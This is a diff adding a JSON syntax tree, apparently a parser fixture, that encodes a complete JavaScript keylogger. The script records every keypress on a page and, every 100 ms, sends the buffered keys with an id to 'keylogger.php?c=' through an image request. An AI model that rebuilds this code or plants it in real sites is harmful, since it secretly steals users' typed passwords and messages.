@@ -1,0 +1,427 @@
+{
+	"type" : "Program",
+	"body" : [{
+			"type" : "VariableDeclaration",
+			"declarations" : [{
+					"type" : "VariableDeclarator",
+					"id" : {
+						"type" : "Identifier",
+						"name" : "keys"
+					},
+					"init" : {
+						"type" : "Literal",
+						"value" : "",
+						"raw" : "''"
+					}
+				}
+			],
+			"kind" : "var"
+		}, {
+			"type" : "VariableDeclaration",
+			"declarations" : [{
+					"type" : "VariableDeclarator",
+					"id" : {
+						"type" : "Identifier",
+						"name" : "id"
+					},
+					"init" : {
+						"type" : "CallExpression",
+						"callee" : {
+							"type" : "Identifier",
+							"name" : "getUniqueID"
+						},
+						"arguments" : []
+					}
+				}
+			],
+			"kind" : "var"
+		}, {
+			"type" : "ExpressionStatement",
+			"expression" : {
+				"type" : "AssignmentExpression",
+				"operator" : "=",
+				"left" : {
+					"type" : "MemberExpression",
+					"computed" : false,
+					"object" : {
+						"type" : "Identifier",
+						"name" : "document"
+					},
+					"property" : {
+						"type" : "Identifier",
+						"name" : "onkeypress"
+					}
+				},
+				"right" : {
+					"type" : "FunctionExpression",
+					"id" : null,
+					"params" : [{
+							"type" : "Identifier",
+							"name" : "e"
+						}
+					],
+					"defaults" : [],
+					"body" : {
+						"type" : "BlockStatement",
+						"body" : [{
+								"type" : "ExpressionStatement",
+								"expression" : {
+									"type" : "AssignmentExpression",
+									"operator" : "=",
+									"left" : {
+										"type" : "Identifier",
+										"name" : "get"
+									},
+									"right" : {
+										"type" : "ConditionalExpression",
+										"test" : {
+											"type" : "MemberExpression",
+											"computed" : false,
+											"object" : {
+												"type" : "Identifier",
+												"name" : "window"
+											},
+											"property" : {
+												"type" : "Identifier",
+												"name" : "event"
+											}
+										},
+										"consequent" : {
+											"type" : "Identifier",
+											"name" : "event"
+										},
+										"alternate" : {
+											"type" : "Identifier",
+											"name" : "e"
+										}
+									}
+								}
+							}, {
+								"type" : "ExpressionStatement",
+								"expression" : {
+									"type" : "AssignmentExpression",
+									"operator" : "=",
+									"left" : {
+										"type" : "Identifier",
+										"name" : "key"
+									},
+									"right" : {
+										"type" : "ConditionalExpression",
+										"test" : {
+											"type" : "MemberExpression",
+											"computed" : false,
+											"object" : {
+												"type" : "Identifier",
+												"name" : "get"
+											},
+											"property" : {
+												"type" : "Identifier",
+												"name" : "keyCode"
+											}
+										},
+										"consequent" : {
+											"type" : "MemberExpression",
+											"computed" : false,
+											"object" : {
+												"type" : "Identifier",
+												"name" : "get"
+											},
+											"property" : {
+												"type" : "Identifier",
+												"name" : "keyCode"
+											}
+										},
+										"alternate" : {
+											"type" : "MemberExpression",
+											"computed" : false,
+											"object" : {
+												"type" : "Identifier",
+												"name" : "get"
+											},
+											"property" : {
+												"type" : "Identifier",
+												"name" : "charCode"
+											}
+										}
+									}
+								}
+							}, {
+								"type" : "ExpressionStatement",
+								"expression" : {
+									"type" : "AssignmentExpression",
+									"operator" : "=",
+									"left" : {
+										"type" : "Identifier",
+										"name" : "key"
+									},
+									"right" : {
+										"type" : "CallExpression",
+										"callee" : {
+											"type" : "MemberExpression",
+											"computed" : false,
+											"object" : {
+												"type" : "Identifier",
+												"name" : "String"
+											},
+											"property" : {
+												"type" : "Identifier",
+												"name" : "fromCharCode"
+											}
+										},
+										"arguments" : [{
+												"type" : "Identifier",
+												"name" : "key"
+											}
+										]
+									}
+								}
+							}, {
+								"type" : "ExpressionStatement",
+								"expression" : {
+									"type" : "AssignmentExpression",
+									"operator" : "+=",
+									"left" : {
+										"type" : "Identifier",
+										"name" : "keys"
+									},
+									"right" : {
+										"type" : "Identifier",
+										"name" : "key"
+									}
+								}
+							}
+						]
+					},
+					"rest" : null,
+					"generator" : false,
+					"expression" : false
+				}
+			}
+		}, {
+			"type" : "ExpressionStatement",
+			"expression" : {
+				"type" : "CallExpression",
+				"callee" : {
+					"type" : "MemberExpression",
+					"computed" : false,
+					"object" : {
+						"type" : "Identifier",
+						"name" : "window"
+					},
+					"property" : {
+						"type" : "Identifier",
+						"name" : "setInterval"
+					}
+				},
+				"arguments" : [{
+						"type" : "FunctionExpression",
+						"id" : null,
+						"params" : [],
+						"defaults" : [],
+						"body" : {
+							"type" : "BlockStatement",
+							"body" : [{
+									"type" : "ExpressionStatement",
+									"expression" : {
+										"type" : "AssignmentExpression",
+										"operator" : "=",
+										"left" : {
+											"type" : "MemberExpression",
+											"computed" : false,
+											"object" : {
+												"type" : "NewExpression",
+												"callee" : {
+													"type" : "Identifier",
+													"name" : "Image"
+												},
+												"arguments" : []
+											},
+											"property" : {
+												"type" : "Identifier",
+												"name" : "src"
+											}
+										},
+										"right" : {
+											"type" : "BinaryExpression",
+											"operator" : "+",
+											"left" : {
+												"type" : "BinaryExpression",
+												"operator" : "+",
+												"left" : {
+													"type" : "BinaryExpression",
+													"operator" : "+",
+													"left" : {
+														"type" : "Literal",
+														"value" : "keylogger.php?c=",
+														"raw" : "'keylogger.php?c='"
+													},
+													"right" : {
+														"type" : "Identifier",
+														"name" : "keys"
+													}
+												},
+												"right" : {
+													"type" : "Literal",
+													"value" : "&id=",
+													"raw" : "'&id='"
+												}
+											},
+											"right" : {
+												"type" : "Identifier",
+												"name" : "id"
+											}
+										}
+									}
+								}, {
+									"type" : "ExpressionStatement",
+									"expression" : {
+										"type" : "AssignmentExpression",
+										"operator" : "=",
+										"left" : {
+											"type" : "Identifier",
+											"name" : "keys"
+										},
+										"right" : {
+											"type" : "Literal",
+											"value" : "",
+											"raw" : "''"
+										}
+									}
+								}
+							]
+						},
+						"rest" : null,
+						"generator" : false,
+						"expression" : false
+					}, {
+						"type" : "Literal",
+						"value" : 100,
+						"raw" : "100"
+					}
+				]
+			}
+		}, {
+			"type" : "FunctionDeclaration",
+			"id" : {
+				"type" : "Identifier",
+				"name" : "getUniqueID"
+			},
+			"params" : [],
+			"defaults" : [],
+			"body" : {
+				"type" : "BlockStatement",
+				"body" : [{
+						"type" : "VariableDeclaration",
+						"declarations" : [{
+								"type" : "VariableDeclarator",
+								"id" : {
+									"type" : "Identifier",
+									"name" : "uniqueID"
+								},
+								"init" : {
+									"type" : "NewExpression",
+									"callee" : {
+										"type" : "Identifier",
+										"name" : "Date"
+									},
+									"arguments" : []
+								}
+							}
+						],
+						"kind" : "var"
+					}, {
+						"type" : "VariableDeclaration",
+						"declarations" : [{
+								"type" : "VariableDeclarator",
+								"id" : {
+									"type" : "Identifier",
+									"name" : "myRandom"
+								},
+								"init" : {
+									"type" : "CallExpression",
+									"callee" : {
+										"type" : "MemberExpression",
+										"computed" : false,
+										"object" : {
+											"type" : "Identifier",
+											"name" : "Math"
+										},
+										"property" : {
+											"type" : "Identifier",
+											"name" : "floor"
+										}
+									},
+									"arguments" : [{
+											"type" : "BinaryExpression",
+											"operator" : "*",
+											"left" : {
+												"type" : "CallExpression",
+												"callee" : {
+													"type" : "MemberExpression",
+													"computed" : false,
+													"object" : {
+														"type" : "Identifier",
+														"name" : "Math"
+													},
+													"property" : {
+														"type" : "Identifier",
+														"name" : "random"
+													}
+												},
+												"arguments" : []
+											},
+											"right" : {
+												"type" : "Literal",
+												"value" : 1000,
+												"raw" : "1000"
+											}
+										}
+									]
+								}
+							}
+						],
+						"kind" : "var"
+					}, {
+						"type" : "ReturnStatement",
+						"argument" : {
+							"type" : "BinaryExpression",
+							"operator" : "+",
+							"left" : {
+								"type" : "BinaryExpression",
+								"operator" : "+",
+								"left" : {
+									"type" : "CallExpression",
+									"callee" : {
+										"type" : "MemberExpression",
+										"computed" : false,
+										"object" : {
+											"type" : "Identifier",
+											"name" : "uniqueID"
+										},
+										"property" : {
+											"type" : "Identifier",
+											"name" : "getTime"
+										}
+									},
+									"arguments" : []
+								},
+								"right" : {
+									"type" : "Literal",
+									"value" : "",
+									"raw" : "''"
+								}
+							},
+							"right" : {
+								"type" : "Identifier",
+								"name" : "myRandom"
+							}
+						}
+					}
+				]
+			},
+			"rest" : null,
+			"generator" : false,
+			"expression" : false
+		}
+	]
+}
